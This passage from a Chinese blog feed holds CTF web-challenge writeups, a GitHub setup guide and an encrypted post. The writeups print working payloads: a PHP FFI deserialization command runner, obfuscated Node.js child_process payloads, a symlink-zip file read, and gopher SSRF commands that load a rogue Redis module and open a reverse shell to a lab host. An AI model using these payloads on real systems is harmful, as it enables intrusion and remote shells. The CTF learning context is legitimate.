文件中的内容对之后的请求均可用。更多细节可以阅读：<a href="https://wiki.php.net/rfc/preload">https://wiki.php.net/rfc/preload</a> ，在这篇文档尾巴可以看到如下描述：</p><blockquote><p> 允许在 <strong>preload</strong> 文件中使用 <strong>FFI</strong> 拓展</p></blockquote><p>在这个题目里的preload.php内容为</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpfinal class A implements Serializable &#123;    protected $data &#x3D; [        &#39;ret&#39; &#x3D;&gt; null,        &#39;func&#39; &#x3D;&gt; &#39;print_r&#39;,        &#39;arg&#39; &#x3D;&gt; &#39;1&#39;    ];private function run () &#123;    $this-&gt;data[&#39;ret&#39;] &#x3D; $this-&gt;data[&#39;func&#39;]($this-&gt;data[&#39;arg&#39;]);&#125;public function __serialize(): array &#123;    return $this-&gt;data;&#125;public function __unserialize(array $data) &#123;    array_merge($this-&gt;data, $data);    $this-&gt;run();&#125;public function serialize (): string &#123;    return serialize($this-&gt;data);&#125;public function unserialize($payload) &#123;    $this-&gt;data &#x3D; unserialize($payload);    $this-&gt;run();&#125;public function __get ($key) &#123;    return $this-&gt;data[$key];&#125;public function __set ($key, $value) &#123;    throw new \Exception(&#39;No implemented&#39;);&#125;public function __construct () &#123;    throw new \Exception(&#39;No implemented&#39;);&#125;&#125;</code></pre><p>然后按照官方文档FFI可以直接执行php语句</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$ffi &#x3D; FFI::cdef(&quot;int system(const char *command);&quot;);$ffi-&gt;system(&quot;id &gt; &#x2F;tmp&#x2F;eki&quot;);echo file_get_contents(&quot;&#x2F;tmp&#x2F;eki&quot;);@unlink(&quot;&#x2F;tmp&#x2F;eki&quot;);</code></pre><p>所以在这个题里可以利用run方法直接执行命令</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpfinal class A implements Serializable &#123;    protected $data &#x3D; [        &#39;ret&#39; &#x3D;&gt; null,        &#39;func&#39; &#x3D;&gt; &#39;FFI::cdef&#39;,        &#39;arg&#39; &#x3D;&gt; &#39;int system(const char *command);&#39;    ];    public function serialize (): string &#123;        return serialize($this-&gt;data);    &#125;    public function unserialize($payload) &#123;        $this-&gt;data &#x3D; unserialize($payload);    &#125;&#125;$a &#x3D; new A();echo serialize($a);</code></pre><p>这里对生成的序列化内容进行反序列化后，再调用它的__serialize方法就可以跳到run方法里，run方法里的语句现在就相当于<code>$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);</code></p><p>然后就是<code>$ffi-&gt;system(&quot;id &gt; /tmp/eki&quot;);</code>，也就是</p><p><code>__serialize()[&#39;ret&#39;]-&gt;system(&quot;whoami &gt; /var/www/html/test.txt&quot;);</code></p><p>最终payload为<code>a=$a=unserialize(&#39;C:1:&quot;A&quot;:95:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:32:&quot;int system(const char *command);&quot;;&#125;&#125;&#39;)-&gt;__serialize()[&#39;ret&#39;]-&gt;system(&quot;cat /f*&gt; /var/www/html/test.txt&quot;);</code></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230516164713321.png" alt="image-20230516164713321"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230516165019304.png" alt="image-20230516165019304"></p><p>都写到这了，就再说一说其它几种饶过disable_function的方式</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230516165131452.png" alt="image-20230516165131452"></p><p><a href="https://www.cnblogs.com/karsa/p/13051079.html">https://www.cnblogs.com/karsa/p/13051079.html</a></p><h2 id="FBCTF2019-Event"><a href="#FBCTF2019-Event" class="headerlink" title="[FBCTF2019]Event"></a>[FBCTF2019]Event</h2><p>flask session伪造</p><h2 id="SWPU2019-Web3"><a href="#SWPU2019-Web3" class="headerlink" title="[SWPU2019]Web3"></a>[SWPU2019]Web3</h2><p>flask session伪造+文件上传软连接</p><pre class="language-txt" data-language="txt"><code class="language-txt">1.在 linux 中，&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;会指向进程的当前目录，在不知道 flask 工作目录时，我们可以用&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;flag&#x2F;flag.jpg来访问 flag.jpg。2.ln -s是Linux的软连接命令,其类似与windows的快捷方式。比如ln -s &#x2F;etc&#x2F;passwd shawroot 这会出现一个名为shawroot的文件,其内容为&#x2F;etc&#x2F;passwd的内容。</code></pre><p>这里对有软连接的压缩包解压出的内容就是软连接对应的文件内容</p><p>也就说，如果我们使用ln -s /proc/self/cwd/flag/flag.jpg test</p><p>然后再对test文件进行压缩</p><p>zip -ry test.zip test </p><pre class="language-txt" data-language="txt"><code class="language-txt">-r：将指定的目录下的所有子目录以及文件一起处理-y：直接保存符号连接，而非该连接所指向的文件，本参数仅在UNIX之类的系统下有效。</code></pre><p>到时候上传到服务器上，服务器进行解压后再显示的内容就也是 /proc/self/cwd/flag/flag.jpg的内容</p><h2 id="网鼎杯-2020-青龙组-notes"><a href="#网鼎杯-2020-青龙组-notes" class="headerlink" title="[网鼎杯 2020 青龙组]notes"></a>[网鼎杯 2020 青龙组]notes</h2><p><strong>Undefsafe 模块原型链污染（CVE-2019-10795）</strong></p><p><strong>&lt; 2.0.3</strong></p><h2 id="HFCTF-2021-Final-easyflask"><a href="#HFCTF-2021-Final-easyflask" class="headerlink" title="[HFCTF 2021 Final]easyflask"></a>[HFCTF 2021 Final]easyflask</h2><p>伪造session</p><p>python反序列化</p><h2 id="PwnThyBytes-2019-Baby-SQL"><a href="#PwnThyBytes-2019-Baby-SQL" class="headerlink" title="[PwnThyBytes 2019]Baby_SQL"></a>[PwnThyBytes 2019]Baby_SQL</h2><p>构造PHP_SESSION_UPLOAD_PROGRESS的POST请求。就会自动进行session_start()，从而绕过session的判断</p><p><a href="https://www.freebuf.com/vuls/202819.html">利用session.upload_progress进行文件包含和反序列化渗透 - FreeBuf网络安全行业门户</a></p><h2 id="HITCON-2016-Leaking"><a href="#HITCON-2016-Leaking" class="headerlink" title="[HITCON 2016]Leaking"></a>[HITCON 2016]Leaking</h2><p>nodejs的一个旧版本特性</p><pre class="language-none"><code class="language-none">在较早一点的 node 版本中 (8.0 之前)，当 Buffer 的构造函数传入数字时, 会得到与数字长度一致的一个 Buffer，并且这个 Buffer 是未清零的。8.0 之后的版本可以通过另一个函数 Buffer.allocUnsafe(size) 来获得未清空的内存。</code></pre><p>所以就直接Buffer(1000)这种去读内存，多读几次就行</p><h2 id="CISCN2019-华东北赛区-Web2"><a href="#CISCN2019-华东北赛区-Web2" class="headerlink" title="[CISCN2019 华东北赛区]Web2"></a>[CISCN2019 华东北赛区]Web2</h2><p>使用html markup绕过xss</p><p>联合注入</p><h2 id="NPUCTF2020-验证🐎"><a href="#NPUCTF2020-验证🐎" class="headerlink" title="[NPUCTF2020]验证🐎"></a>[NPUCTF2020]验证🐎</h2><p>nodejs的弱类型比较</p><p>加个命令执行的绕过</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token function">Function</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span>                    <span class="token number">99</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">77</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span>                    <span class="token number">46</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">113</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span>                    <span class="token number">95</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">120</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span>                    <span class="token number">121</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">103</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><pre class="language-java" data-language="java"><code class="language-java">(Math&#x3D;&gt;(Math&#x3D;Math.constructor,Math.constructor(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41,46,116,111,83,116,114,105,110,103,40,41))()))(Math+1)</code></pre><p>看不懂</p><p>我直接爬</p><h2 id="网鼎杯-2020-玄武组-SSRFMe"><a href="#网鼎杯-2020-玄武组-SSRFMe" class="headerlink" title="[网鼎杯 2020 玄武组]SSRFMe"></a>[网鼎杯 2020 玄武组]SSRFMe</h2><p>SSRF的简单绕过和redis主从复制漏洞</p><p><strong><a href="https://github.com/xmsec/redis-ssrf">https://github.com/xmsec/redis-ssrf</a><br><a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></strong></p><p>服务器下开启<strong>rogue-server.py</strong> 启动之后用于伪装为主redis，它开启的端口为6666,注意需要将第二个工具exp.so导入到第一个工具下，也就是和rogue-server.py同目录<br>接下来在web界面利用gopher协议入到从redis之中：</p><pre class="language-none"><code class="language-none">gopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_auth%2520root%250d%250aconfig%2520set%2520dir%2520&#x2F;tmp&#x2F;%250d%250aquitgopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_auth%2520root%250d%250aconfig%2520set%2520dbfilename%2520exp.so%250d%250aslaveof%2520174.1.185.67%25206666%250d%250aquitgopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_auth%2520root%250d%250amodule%2520load%2520&#x2F;tmp&#x2F;exp.so%250d%250asystem.rev%2520174.1.185.67%25206663%250d%250aquit</code></pre><p>注释</p><pre class="language-none"><code class="language-none">gopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_auth rootconfig set dir &#x2F;tmp&#x2F;quit&#x2F;&#x2F;设置备份文件路径为&#x2F;tmp&#x2F; 顺便说一下看到当时大佬的博客说试了很多目录，最后发现只有&#x2F;tmp有权限 ，只需要有读权限即可，所以说平时做渗透或者做题好多试试啊gopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_auth rootconfig set dbfilename exp.soslaveof 174.1.185.67 6666quit&#x2F;&#x2F;设置备份文件名为：exp.so，设置主redis地址为174.1.185.67，端口为6666 地址为buu开启的linux lab地址gopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_auth rootmodule load &#x2F;tmp&#x2F;exp.sosystem.rev 174.1.185.67 6663quit&#x2F;&#x2F;导入 exp.so ，反弹shell到174.1.185.67:6663</code></pre><h2 id="CISCN2021-Quals-upload"><a href="#CISCN2021-Quals-upload" class="headerlink" title="[CISCN2021 Quals]upload"></a>[CISCN2021 Quals]upload</h2><p>二次渲染文件上传</p><h2 id="PHP调用方法7-4-新特性"><a href="#PHP调用方法7-4-新特性" class="headerlink" title="PHP调用方法7.4+新特性"></a>PHP调用方法7.4+新特性</h2><p>[$object, &#39;methodName&#39;]()</p><p><a href="http://www.plasf.cn/">&gt;Gq安全研究记录 (plasf.cn)</a></p><p>反序列化的时候应该很有用</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>github使用</title>
      <link href="/2021/10/02/github%E4%BD%BF%E7%94%A8/"/>
      <url>/2021/10/02/github%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>​    在学python的时候顺便学了些GitHub的使用，写个文档防止忘了</p> <span id="more"></span><p><strong>绑定用户</strong></p><p>打开git-bash</p><p>填写用户名和密码</p><p>提示（配置的帐号名和邮箱一定要与GitHub相同，不然会提交失败）</p><pre class="language-none"><code class="language-none">git config --global user.name &quot;@@@&quot;     (GitHub相对应的帐号名称)git config --global user.email &quot;123@163.com&quot;  （GitHbu相对应的邮箱帐号）</code></pre><p><strong>设置ssh key</strong></p><p>生成ssh key</p><p>首先检查是否已生成密钥 cd ~/.ssh，ls如果有3个文件，则密钥已经生成，id_rsa.pub就是公钥</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDE4LmNuYmxvZ3MuY29tL2Jsb2cvNzc0ODI0LzIwMTkwNy83NzQ4MjQtMjAxOTA3MTExNDU0MTYwMjAtOTMyNTYwNjcxLnBuZw?x-oss-process=image/format,png" alt="img"></p><p> 如果没有，输入: ssh-keygen -t rsa -C &quot;你的邮箱&quot;</p><p>复制ssh key</p><p> 方法1: 输入 clip &lt; ~/.ssh/id_rsa.pub   会自动复制ssh key，可以直接粘贴</p><p> 方法2:在c/Users/Administrator/.ssh/id_rsa)文件找到直接复制</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDE4LmNuYmxvZ3MuY29tL2Jsb2cvNzc0ODI0LzIwMTkwNy83NzQ4MjQtMjAxOTA3MTExNTA5MzI2MTItMTQ3ODE2MTQ3NC5wbmc?x-oss-process=image/format,png" alt="img"></p><p>连接github，打开GitHub 进入setting找到ssh key并新建</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/github%E4%BD%BF%E7%94%A8/format,png.png" alt="img"></p><p>然后测试连接是否成功</p><p>输入: ssh -T <a href="mailto:&#103;&#x69;&#116;&#x40;&#103;&#x69;&#x74;&#x68;&#117;&#x62;&#x2e;&#99;&#111;&#109;">&#103;&#x69;&#116;&#x40;&#103;&#x69;&#x74;&#x68;&#117;&#x62;&#x2e;&#99;&#111;&#109;</a> </p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDE4LmNuYmxvZ3MuY29tL2Jsb2cvNzc0ODI0LzIwMTkwNy83NzQ4MjQtMjAxOTA3MTExNTI1MDg3MzYtNDUwMTA1MTMwLnBuZw?x-oss-process=image/format,png" alt="img"></p><p><strong>上传</strong></p><p>上传的基本步骤就是这样了</p><p>先打开一个文件夹按着图片里的步骤来</p><p>先初始化再把想传的文件传上去</p><p>可以用git add .上传所有文件</p><pre class="language-none"><code class="language-none">注：输入git add .后如果报错warning: LF will be replaced by CRLF in gradlew.The file will have its original line endings in your working directory则在输入git config --global core.autocrlf false后再重新输入git add .命令即可</code></pre><p>git commit添加备注</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/github%E4%BD%BF%E7%94%A8/image-20211002123234287.png" alt="image-20211002123234287"></p><p>克隆仓库</p><pre class="language-console" data-language="console"><code class="language-console">$ git clone 网址 [自定义目录名]</code></pre><p>可以用https://或git://或ssh传输协议</p><p>查看连接的仓库地址</p><pre class="language-none"><code class="language-none">git remote -v</code></pre><p>如果在另外的文件夹提交需重新进行一遍图中步骤</p><p>还要再push前输入</p><pre class="language-none"><code class="language-none">git pull --rebase origin main</code></pre><p>该命令的意思是把远程库中的<strong>更新合并</strong>到（<strong>pull=fetch+merge</strong>）本地库中，<strong>–-rebase</strong>的作用是取消掉本地库中刚刚的commit，并把他们<strong>接到</strong>更新后的版本库之中。出现如下图执行pull执行成功后，可以成功执行git push origin main操作。</p><p>否则就会因为本地库与远程库不一致导致报错</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/github%E4%BD%BF%E7%94%A8/image-20211002130237512.png" alt="image-20211002130237512"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>总结</title>
      <link href="/2021/08/31/%E6%80%BB%E7%BB%93/"/>
      <url>/2021/08/31/%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="5677275062678a5c9c44bfabd2f6072fe42f9134209fe5836670b29d93f78849">d55db17c59acd0a076373f5618149936d6336804120d7706b0bd474d7690c83560f5b1a2978403e63d06e384fd2b3216f60ffceb2be10fe923607ba2a3f63da8dddc37422310a5b600da568983241b725ebb5784573b4837f12f9dfee6e1d0dd72e209714b32d93b0ef55fc4e7a89ab29ff4b089ed27a2d7ceb9fc648019985b7390adb30c8609a460946f3062435e69322430a5308708dad4ec31d253a7f50c0d40efb9763bc49f51563d7895f3aeb111974faf9dac8a2c3c3824ca78636021bfd6b5ea6f7b652b789dd74c4a4650f9769ac39412bf77dba8039614a7816ab2c3c4b0dc3cc3c8d2eebc8b88f8ea40ae1bb10c76e607fa8a630542d168a6ae50bcc89de5ff84693b17defce908f8a5bf6309fa24d6ce350cb3ca8adbe5127c64086aa20800d04df45911058fce610491c6975ae1a924cd4901f6a74788827e7e24480e2e6548ba6fdf886aaf6b260658792c19243b331f67fa6cb07f1db1a55274926c816ce8d54f5ef7da0b55c9dd511715b3edfd2114a3c98a7131ab1eccb16401d375549f5fa8d7119af8b9ce652ba14588b606c5fcd1dff4ce9660d3de222482e15a304a5e112eb4f3a6c15bd6ea6627fa2fad47fa71c98bf7e8de3d188024847a5f3942567732d3ea3b7808dc6fb04f2e4e1a105fd3bb9073969c6ed1c884e554f30400bf6a9d5add149fe3b9f270184401c3c174e485188c7ac1984e0d67a1a478848747e7c862e4ce79196b45739a65c80d4a340807428a0cb663e013a226f62c6452998d654025723019424810984d8644456843241b81f93b31d6b62e0e925835559587e9d28921df407dade7f5ff57cdbf580a302c9dff98099c8c6709c5e097943f98a5e5acf496175aa3e021bcac9c8f551befea08d751c926164108f6285b230901fab837ef76cde010a9505a37f1ebd35e637e327b04261283b52c431616922a5447d79146af67d69c3a20cc041957c5b49a1bcb10b8c1a3364627c919ca24082e1be6c50bab5c40b3046c0ca8ffc81d43eb2ffdeee91765ba936d5cc2812f169002f5fd2a1c31fb36b187cc395c19d627de06b6fa1e23faae9536060c63bc2a8dc5cac939755dce2f5c6462fcdc7b24aca17da09a4e752614124669e45267e36b901e9cbb3064e3f260980faf571f8c63311d08358d30377fdb701f26baff3ed841dbc60ef85f8ea6ac432728ae4f43cec3f9214daf1b4512f28a2ee15caefa12717f3267c55ad789bc1ae73a46594b642177318cbdbe574322941391b3888aa0d7572213ac6754bb0fc6f7aafabc38f5e7c8bbebaee0c2fae7583165d60f7c1f45843f21ac318cdf5f18aa18e84539223e44ee228b9f361918713439968d8c2f8f8320b7f2d92ee0a2d5fe30c8b83abf0e8397235d27e60007d8ded1908898bf1e7b06a7c855446e4d7026cf5df83d65506515bd651b7afd573a83fe5a99410299324ef482acd8c902af37151fcbcae541a4114831290147ec6abb1da8e96e2fac437a8eefbcd522f865a869ba6672ebbc2f863f2da081c5452be323f93fc7ca92b15960c03c20280333eb9ab2741da3e0b704e2cf6fb0baecb5e1ab187b8647dfed656fde0f8403fa8513c29cdcd5d1ba622c70400ee30a6250c5ac0788e2d582c480b78e2534173ea824cf3008c777426a934cc3b45c0ba7986b8502b1c485cea2aeb797ad1b11bc9a325b53e57e65c1170d575ecd3facb7fa4c1f71739b71af5c500c9953865fa3fb3b59afc91e5ca83dfbe42dbf0e0287206d10f4117c02af60756e5d12b688cef3347f5d002af507fef80ae4a47565a03555dd72db5c5091874219183eaf07440d05b7acc12bab4f82e08ec2b6c7b8f90fa0b8eeef36e672fd13ae9fe5c4623d10fca00ffcddd381f6e3bdcd61a27208cdc6b85dbef789e547df128b43141236235c3cb5659343975f18599da5bca54677d8bc8fc2ff8a9a045869d7f79ccd9a62f48c5541dcd98bc2913f467c230bc2f66a3caa445d7725b6011aea809d7e110cb3bd2bc0ffc0ec1098f87607c3eac77de16c100ad2207f6ad75c412fdcaed7a110255f4dbc717a6a68eeb745e780c80b8afab0a6913cdc3e2b67c72d33787fafede28615ce6c918077b5a5f6252e8cd842ebcfe76e9b24fc4f2c86649acbb6c15c928defdc024756ac6c3fd89d20873c6beba1648a209b02a52ac915617917b57ef07db9da4d461f1686f865cc12a76a367451661146c94342952dfe978162f69e701a2f4398d0365ad3ac7a35e7e56081048072cfe882c1840cd3072942d7f228c9a643afb974ac87e47309af143c2e4a036af10222abadd2235997aaa516b232fd7c340dd916ed6e7eee5e6640803754d9d7ab41ad394f3b065941bf735593879fa9003eeb3dc1f31cb6d6a78968b0b6721a50e6619c6298075d1c93f541430d72c0702354211070a71980599e23590bb48278023580c86d4c5f550368ee635cf7e5e1c99fc60a87c5f814c1e3a87ea169a937466680ab71a938782465339cd9d9d95a467cbc0dee85cbb83019e6a4c0d871ea078debcab92d87623538040ec7a6c720d22de139628328d2eedca4039e259909ffe16b377650a2cdb09d4c366a8d3eb5761fcdad71fc11d5b3c01deb84417b2cddef921fef14a0c1e438f92a1551ca33b302a8e5c71693626940d6848d334e28c9a80fdd3cff723173b1a9be2e8d759dc7a8bba376a2a6d1f2d137db06fa6852e6bf0124e7975f938dcb0864c03890ac758729217df4bc3c141e2444b0758b6c0294f602d3a52a704e136bd9602bd3bf361beba9ac2840a5ae607ea53bcd017352bbe883c367ba8e463478e18c6b4e83c9cb1da9839ce369cc99a2e39dcaf3709162de8456cdd8ab428f76f4eb3ffdadd2fbc7ce472f5cc2005330e601358f1423549604c9a1edafca428268ccf418a0919dcfd9c10e1bd60640403581c09865f5cfc824c7a43fda69bea65c007ca571a7572079ba33365968cf336f01241e206eca1dba23bddd2d89862244ae5fca386d074d43281510cfd24bf93ccef5ede1b6f8e890a5327a0edb94b5a1a184024f61efb9d11d3fc3c4bb7c09620c6ac1575cb4f593c4c955b08c1cfbbbbb7accb336d32af0dabdd01c42d415b358f70c8527e1b4425460795b2b0cb600493de28e6be78704b1adbe29517171f2f333127a3e3388d3a12eccbd884f443a8206e4f6187c1e0f39649352591f57d3b9a09abee25a0533b09790a509ab5e0f3f2baf0e1e6732f7df8c69c3c49991024e2941a82f1603931428f5265fcfd657d96ff262f1e61b1a41e84ff4cc695b98d9c5e8f2d0ec5761b20588c9e3e23b6770cd544df121d6d615f87742889646fe83b5465860fc1a523a2493eaeb357901a8f965b81d8d61d88250ae4eb7dc0302b79ca48527474c687a4dd51a44315dc0755a7c854ad393c4a4a767099a8b5d29637919e0bed4959a2678930b458a67168b4bf519ddade5accb727609591da812cbfbd5cb66a20f1e6f14f1abe107338f351fa9bc50eef31fc2e3134e277f01a0e8e113dc9a816c88de69263c003a1af6fec5652a636019255902ed1fc4896d4fcd86d41e52d012071196521c8beef36abb5c05b96523bafabdd309878ef92d10ddd0e18205f9de5a5d04a469b08b08be60415f5a9e91377ec89922680680f8e006d083c73318b987d0bbb6756ca07d3ef427ceb732f8a85096f58832df7f5157b57616a44b0ecbe1429e304af89efbefdd76c6c7dab397cbe5734e1ba8c75ed39641ae83d72198e2ca5379b2b6f3c21923d467a3c230d72b6eeff91426c3e7c8a5c0537fb5f6ee1728e14281090839949ac61a220355d8b9f389c8e8544a442ffa7abd108c0c59e5a07c2057f626f624898d0f4e7a3887b9294d07042a26d373a6e22bf715b8747d15d24b83b20b0c386e5e2c082101f6d1fdb7691ed869fd8b6e12842e054fdbefe52fd99aca47c7a866425fe59ef59d0207469323aab033a1857ecb9500de779083fa0127ef33f182c8efd6625207b29564c74c913cfd8dec6ed465b8e01965af4120eeee1e7ec0d0354a5899f8e3b02b2968bd9ccae917cceaa0d6a8f1c08dec2cce733f81f9a130dcf8a665ad59b41482ab9cd53e4ff281ec4395fb3a045cd6082a36692432bd8ac20507eec66af478dc1d36158eef04fd00a5a98d48de035b6704a00391ebf2c7dcbd0614917a8e834565e684bf1640e282f9c12fdd8a45f97c14cbbde7f0681e8e6f074ec8f88439a03206cf2c88321b1ca36e2cdcc6c8bdf70c2638fa0ae7e395a69b758774ce14104033ae74bd96536ba704c7c3402f6549b6368ea8fe4f7ecb442ee950cbc6f5f479dcdd8ec34498283451758c8fb52021c27c1ddd5f30c7832fa3c9aea152ac404aaebc1f677ad6207083ce94b28833beba5cddd1c2c593310a14274c57643fcccdade29a1caf4f1219f3d7693a75eaa6e0216eafec5892e2df28e335f7305d66a230a6b267f1bcc1b238bd4cc96560e1549628f3098123841edb4af544c4eff9c184789c6e9c53c834de4a58183b41d8ba874b04a406e322b5227573b7c0cf2d69a77c2934e30584f615dfbe61bad4130256c026d33216d4328f27da17e707dc805262c39f92fae4e9e720de0ef8ddda10f1aa58c957fe1f2e997fcf14b7f2441fc2aa6d8a6862736bfd23d398c57c228f538812f6202d351d38b51776f83b0f87d63b466a7f3701f5842b802d8aff3cca49ed42f8739da3b5123ce33a3d6b0a55cf0f93a2c1624f8c4314197443eeca782a316df15f0d95d6f4159903a4d97b164d8b1f5b8a73b47656b9b6a51bfef31f4caca48f26bdba25946d161766dfb5fe66a6c025d2de1ede3fb053e60fbe5b35fb0890b1d8ba4cd2d1539e9101eca772898c84b45fc910653d4cf5ac51198105e755a9a5f315154a5137838f1446f74f5aaa4ae8d820f20c76d179755046f6c6e3cb5a1aeceaa1ce8ec5c75a6730dc2dd73668fc32cd9a102cc75a809ebfcc9ee0aef33efa406d8b5e3acb17fed3ecf15810706c1560f6027b5358ea676a5334a3cf088df6b1698145241fe718cb1a451887d7c814d6f1ec3b675b9bbb36e5d6a7d242946da3e3aa20aa2002669946d3b039f549dc1bce156322dca8d19ade707c52d9c75f369e8179651f9f7cdfb33e242bafab4051c33a3817892c51f958e6189aa03c9d02433f2ae52d2eaf66bc9786880c6bc4ea4ca8d5d781ed76892c6db56a8eee0da25e7a7d62ac450309550e8600ce133d149d0b24a5728e8ffc47821ef5985cea7637e582807c1a32018a4df670a0a7ab96dd2187484603e0df7a4756247532e06b584954bc5d7886b9dea16f78333282390df1669e77d164b3def2e1df9c7dda0a400622d2bf01a2f210af495ddf1a410190ee82f5d20c1497f7c359608dbf10f1e5c4d0275a1b87c636fa37e22d00c8727bb7b192dfa6895e51be842a85310efca3c83f382ee4bd9ed11f26fa3190e229c05d486835b3497eae9d4fa7ebea0374d9479c837065b9ba1d114c74a5dbf41f31c83f42a2dbfb672b7ed24e091f77e0af73761ab3c162fdea44191bcb410034adbf47e4bf69ebd482e75c6a8daeca324158a96a586ff9f558b2f3684412c0bfc575006df7c43c9be791a568389ca147b8f78c096f63e791af72c6e2a39949ee948521dab8c02e5a85906c2182cd5e19beaf11fae42867efaa7f699f463ebba403b76d308fed97e43133ff7c032c12e82b1865c538e3cedb0958f9f4fb1a7dcaf6e95d04339059d2be655b3c5578385ff0308453fb30d45dc93cd94276e45bb8594c4de613590b796559965e55b494c6c8a5c036e4f6a304c84d39174bdcd895ffd8332e432cc2c50147df9685369044f89c2a425ebe7d5f254bfbfc067e12a3aff87960035c9cb44f35d4a45aa88d70b648f759267dbc370ede50f56b69488c940ab5806432ab37909b039e1e823cd6f22aa48aafbbb78ff201aab78a8c4d05628d961e4bc515015ddb3f4929e46ac4c5367322550fde00e9c0ba095aea13328890683055c3c6908e742838a09fcf2006aa74f810907f647a9f3d8206281d05d317b13d122e5cf36cb24d1dfcbaa0816dbc71cb957039785b186a37e84dc5be806a84904e587000af37dafd6a4bef36b4ff61dafcf6421fdffbc2b37bb6f5c454472e8f